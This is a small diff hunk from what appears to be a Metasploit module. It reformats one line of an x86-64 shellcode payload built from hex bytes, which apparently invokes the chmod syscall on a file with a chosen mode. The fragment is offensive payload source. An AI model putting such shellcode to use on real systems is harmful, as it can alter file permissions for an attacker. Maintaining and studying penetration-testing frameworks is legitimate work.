@@ -42,7 +42,7 @@ module Metasploit3
     payload	=
         "\x6a\x5a"             + # pushq  $0x5a
         "\x58"                 + # pop    %rax
-	call                   + # callq <after _file>
+        call                   + # callq  <after_file>
         file                   + # .ascii "file\0"
         "\x5f"                 + # pop    %rdi
         setmode                + # mov    mode, %esi
